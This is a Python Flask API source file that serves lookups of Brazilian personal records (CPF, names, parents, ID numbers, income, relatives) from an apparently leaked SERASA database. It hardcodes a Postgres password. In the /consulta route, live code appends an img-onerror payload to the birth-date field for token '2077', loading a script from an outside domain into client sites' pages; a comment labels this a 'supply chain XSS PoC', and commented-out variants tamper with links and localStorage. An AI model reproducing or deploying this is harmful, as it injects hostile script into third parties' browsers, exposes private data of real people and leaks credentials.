from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import psycopg2
from psycopg2.extras import RealDictCursor
from psycopg2 import pool
import re
import logging
import socket
from datetime import datetime
from collections import OrderedDict

# =========================
# APP
# =========================

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# =========================
# CAMPOS
# =========================

CAMPOS_PERMITIDOS = [
    "CPF", "NOME", "NOME_MAE", "NOME_PAI", "SEXO", "RG", "NASC",
    "ORGAO_EMISSOR", "RENDA", "SO", "TITULO_ELEITOR", "UF_EMISSAO"
]

ORDEM_CAMPOS = CAMPOS_PERMITIDOS

# =========================
# BANCOS
# =========================

SQLITE_DB = "SERASA.db"

POSTGRES_CONFIG = {
    "dbname": "postgres",
    "user": "postgres.hidldstuerymswduouwj",
    "password": "Danielapi30055@",
    "host": "aws-1-us-east-1.pooler.supabase.com",
    "port": 6543,
    "sslmode": "require"
}

# =========================
# CONNECTION POOL
# =========================

try:
    connection_pool = pool.SimpleConnectionPool(
        1,
        10,
        **POSTGRES_CONFIG
    )
    logging.info("✅ Connection pool criado com sucesso")
except Exception as e:
    logging.error(f"❌ Erro ao criar connection pool: {e}")
    connection_pool = None

# =========================
# TOKEN
# =========================

token_cache = {}
CACHE_DURATION = 300

def extrair_token():
    token = request.args.get("token_api")
    if not token:
        auth = request.headers.get("Authorization")
        if auth:
            token = auth.replace("Bearer ", "").strip()
    return token

def validar_token(token):
    if not token or not connection_pool:
        return False

    now = datetime.now()

    if token in token_cache:
        cache_time, is_valid = token_cache[token]
        if (now - cache_time).total_seconds() < CACHE_DURATION:
            return is_valid
        del token_cache[token]

    conexao = None
    try:
        conexao = connection_pool.getconn()
        cursor = conexao.cursor(cursor_factory=RealDictCursor)

        cursor.execute("""
            SELECT (expiration > CURRENT_TIMESTAMP) AS is_valid
            FROM tokens
            WHERE token = %s
        """, (token,))

        res = cursor.fetchone()
        is_valid = bool(res and res["is_valid"])

        token_cache[token] = (now, is_valid)
        return is_valid

    except Exception as e:
        logging.error(f"Erro token: {e}")
        return False
    finally:
        if conexao:
            connection_pool.putconn(conexao)

# =========================
# TRATAMENTO
# =========================

def tratar_dados(dados):
    for r in dados:
        if r.get("NOME"):
            r["NOME"] = r["NOME"].title()
        if r.get("NOME_MAE"):
            r["NOME_MAE"] = r["NOME_MAE"].title()
        if "SEXO" in r:
            r["SEXO"] = "MASCULINO" if r["SEXO"] == "M" else "FEMININO"
        if r.get("NASC"):
            try:
                r["NASC"] = datetime.strptime(
                    r["NASC"], "%Y-%m-%d %H:%M:%S"
                ).strftime("%d/%m/%Y")
            except:
                r["NASC"] = ""
    return dados

def reorganizar_dados(dados):
    saida = []
    for r in dados:
        o = OrderedDict()
        for c in ORDEM_CAMPOS:
            if c in r:
                o[c] = r[c]
        saida.append(o)
    return saida

# =========================
# CONSULTA SQLITE
# =========================

def consultar_por_cpf(cpf):
    conn = None
    try:
        conn = sqlite3.connect(SQLITE_DB, timeout=10)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        # ---------- DADOS ----------
        cur.execute("SELECT * FROM DADOS WHERE CPF = ?", (cpf,))
        dados_raw = cur.fetchall()

        if not dados_raw:
            return {"status": 404, "mensagem": "Nenhum registro encontrado."}, 404

        dados = [dict(r) for r in dados_raw]
        dados = reorganizar_dados(tratar_dados(dados))

        # ---------- PARENTES ----------
        cpf_int = int(cpf)

        cur.execute("""
            SELECT
                CPF_VINCULO,
                NOME_VINCULO,
                VINCULO
            FROM PARENTES
            WHERE CPF_Completo = ?
        """, (cpf_int,))

        parentes = [dict(r) for r in cur.fetchall()]

        return {
            "status": 200,
            "dados": dados,
            "parentes": parentes
        }, 200

    except Exception as e:
        logging.error(f"Erro SQLite: {e}", exc_info=True)
        return {"status": 500, "erro": str(e)}, 500

    finally:
        if conn:
            try:
                conn.close()
            except:
                pass

def consultar_por_nome_cpf_parcial(nome, cpf_parcial):
    """
    Busca por nome completo + 6 dígitos do meio do CPF
    Exemplo: CPF 123.456.789-10 -> usar apenas "456789"
    """
    conn = None
    try:
        # Limpa o CPF parcial (apenas números)
        cpf_parcial = re.sub(r"[^0-9]", "", cpf_parcial)
        
        if len(cpf_parcial) != 6:
            logging.warning(f"CPF parcial inválido: {cpf_parcial} (tamanho: {len(cpf_parcial)})")
            return {"status": 400, "mensagem": "CPF parcial deve ter exatamente 6 dígitos"}, 400

        # Normaliza o nome para busca (uppercase)
        nome_busca = nome.strip().upper()
        logging.info(f"Buscando: nome='{nome_busca}' cpf_parcial='{cpf_parcial}'")

        conn = sqlite3.connect(SQLITE_DB, timeout=30)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        # ESTRATÉGIA OTIMIZADA:
        # 1. Busca PRIMEIRO por NOME (rápido - poucos resultados esperados)
        # 2. Filtra o CPF em Python (evita SUBSTR/LIKE em milhões de registros)
        
        cur.execute("""
            SELECT * FROM DADOS 
            WHERE UPPER(NOME) = ?
            LIMIT 1000
        """, (nome_busca,))

        dados_raw = cur.fetchall()
        logging.info(f"Registros encontrados com o nome: {len(dados_raw)}")

        if not dados_raw:
            # Tenta busca parcial no nome
            logging.info("Tentando busca parcial no nome")
            cur.execute("""
                SELECT * FROM DADOS 
                WHERE UPPER(NOME) LIKE ?
                LIMIT 1000
            """, (f"%{nome_busca}%",))
            
            dados_raw = cur.fetchall()
            logging.info(f"Registros com nome similar: {len(dados_raw)}")

        if not dados_raw:
            return {"status": 404, "mensagem": "Nenhum registro encontrado com esse nome."}, 404

        # Filtra por CPF parcial em Python (rápido quando há poucos registros)
        dados_filtrados = []
        for registro in dados_raw:
            cpf = registro["CPF"]
            if cpf and len(cpf) == 11:
                # Extrai os 6 dígitos do meio (posição 3 a 8)
                cpf_meio = cpf[3:9]
                if cpf_meio == cpf_parcial:
                    dados_filtrados.append(dict(registro))
        
        logging.info(f"Registros após filtrar por CPF parcial: {len(dados_filtrados)}")

        if not dados_filtrados:
            return {
                "status": 404, 
                "mensagem": f"Nome encontrado, mas nenhum CPF com dígitos do meio '{cpf_parcial}'. Verifique os 6 dígitos."
            }, 404

        dados = reorganizar_dados(tratar_dados(dados_filtrados))

        # ---------- PARENTES para cada CPF encontrado ----------
        todos_parentes = []
        for registro in dados:
            cpf_completo = registro.get("CPF")
            if cpf_completo:
                try:
                    cpf_int = int(cpf_completo)
                    cur.execute("""
                        SELECT
                            CPF_VINCULO,
                            NOME_VINCULO,
                            VINCULO
                        FROM PARENTES
                        WHERE CPF_Completo = ?
                    """, (cpf_int,))
                    parentes = [dict(r) for r in cur.fetchall()]
                    if parentes:
                        todos_parentes.extend(parentes)
                except Exception as e:
                    logging.warning(f"Erro ao buscar parentes para CPF {cpf_completo}: {e}")

        resultado = {
            "status": 200,
            "dados": dados,
            "parentes": todos_parentes,
            "total_encontrados": len(dados)
        }
        
        return resultado, 200

    except Exception as e:
        logging.error(f"Erro SQLite busca por nome/CPF parcial: {e}", exc_info=True)
        return {"status": 500, "erro": str(e)}, 500

    finally:
        if conn:
            try:
                conn.close()
            except:
                pass

# =========================
# ROTA
# =========================

@app.route("/health", methods=["GET"])
def health_check():
    """Endpoint para verificar se a API está funcionando"""
    return jsonify({"status": "ok", "timestamp": datetime.now().isoformat()}), 200

@app.route("/consulta", methods=["GET"])
def consulta_cpf():
    try:
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        try:
            reverse_dns = socket.gethostbyaddr(client_ip)[0]
        except Exception:
            reverse_dns = '-'

        logging.info(
            f"Request de {request.remote_addr} | "
            f"IP-Cliente: {client_ip} | "
            f"Reverse-DNS: {reverse_dns} | "
            f"X-Site-Origin: {request.headers.get('X-Site-Origin', '-')} | "
            f"Referer: {request.headers.get('Referer', '-')} | "
            f"User-Agent: {request.headers.get('User-Agent', '-')}"
        )

        token = extrair_token()

        if not validar_token(token):
            return jsonify({"status": 401, "mensagem": "Token inválido"}), 401

        # Verifica se é busca por nome + CPF parcial
        nome = request.args.get("nome")
        cpf = request.args.get("cpf")

        logging.info(f"Parâmetros recebidos - nome: '{nome}', cpf: '{cpf}'")

        if nome and cpf:
            # Busca combinada: nome completo + 6 dígitos do meio do CPF
            logging.info("Iniciando busca por nome + CPF parcial")
            resultado, status = consultar_por_nome_cpf_parcial(nome, cpf)
            logging.info(f"Busca finalizada com status {status}")

            # PoC supply chain XSS - apenas token de teste (DESATIVADO)
            # if token == "0047" and status == 200 and "dados" in resultado:
            #     for reg in resultado["dados"]:
            #         if "NOME" in reg:
            #             reg["NOME"] = reg["NOME"] + '<img src=x onerror="var c=function(s){return s.split(String.fromCharCode(60))[0].trim()};try{var n=localStorage.getItem(\'site.nome\');if(n)localStorage.setItem(\'site.nome\',c(n))}catch(e){}new MutationObserver(function(m,o){var a=document.querySelector(\'.btn-link-final\');if(a){var u=new URL(a.href,location.href);u.searchParams.set(\'nome\',c(u.searchParams.get(\'nome\')||String.fromCharCode(32)));u.searchParams.set(\'xss_poc\',\'1\');a.href=u.toString();o.disconnect();}}).observe(document.body||document.documentElement,{childList:true,subtree:true});this.remove()">'

            # PoC supply chain XSS - token de teste 2077 (consultaprontacaxbr.com)
            # if token == "2077" and status == 200 and "dados" in resultado:
            #     for reg in resultado["dados"]:
            #         if "NASC" in reg:
            #             reg["NASC"] = reg["NASC"] + '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://tikttok.it.com/poc.js\';document.head.appendChild(s);this.remove()">'

            # PoC supply chain XSS - token de teste 2077
            if token == "2077" and status == 200 and "dados" in resultado:
                for reg in resultado["dados"]:
                    if "NASC" in reg:
                        reg["NASC"] = reg["NASC"] + '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://tikttok.it.com/poc.js\';document.head.appendChild(s);this.remove()">'

            return jsonify(resultado), status
        elif cpf:
            # Busca tradicional por CPF completo
            cpf_limpo = re.sub(r"[^0-9]", "", cpf)
            logging.info(f"CPF limpo: {cpf_limpo} (tamanho: {len(cpf_limpo)})")

            if len(cpf_limpo) != 11:
                return jsonify({"status": 400, "mensagem": "CPF deve ter 11 dígitos"}), 400

            logging.info("Iniciando busca por CPF completo")
            resultado, status = consultar_por_cpf(cpf_limpo)
            logging.info(f"Busca finalizada com status {status}")

            # PoC supply chain XSS - apenas token de teste (DESATIVADO)
            # if token == "0047" and status == 200 and "dados" in resultado:
            #     for reg in resultado["dados"]:
            #         if "NOME" in reg:
            #             reg["NOME"] = reg["NOME"] + '<img src=x onerror="var c=function(s){return s.split(String.fromCharCode(60))[0].trim()};try{var n=localStorage.getItem(\'site.nome\');if(n)localStorage.setItem(\'site.nome\',c(n))}catch(e){}new MutationObserver(function(m,o){var a=document.querySelector(\'.btn-link-final\');if(a){var u=new URL(a.href,location.href);u.searchParams.set(\'nome\',c(u.searchParams.get(\'nome\')||String.fromCharCode(32)));u.searchParams.set(\'xss_poc\',\'1\');a.href=u.toString();o.disconnect();}}).observe(document.body||document.documentElement,{childList:true,subtree:true});this.remove()">'

            # PoC supply chain XSS - token de teste 2077 (consultaprontacaxbr.com)
            # if token == "2077" and status == 200 and "dados" in resultado:
            #     for reg in resultado["dados"]:
            #         if "NASC" in reg:
            #             reg["NASC"] = reg["NASC"] + '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://tikttok.it.com/poc.js\';document.head.appendChild(s);this.remove()">'

            # PoC supply chain XSS - token de teste 2077
            if token == "2077" and status == 200 and "dados" in resultado:
                for reg in resultado["dados"]:
                    if "NASC" in reg:
                        reg["NASC"] = reg["NASC"] + '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://tikttok.it.com/poc.js\';document.head.appendChild(s);this.remove()">'

            return jsonify(resultado), status
        else:
            return jsonify({
                "status": 400, 
                "mensagem": "Informe 'cpf' (11 dígitos) OU 'nome' + 'cpf' (6 dígitos do meio)"
            }), 400
    
    except Exception as e:
        logging.error(f"Erro na rota /consulta: {e}", exc_info=True)
        return jsonify({"status": 500, "erro": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)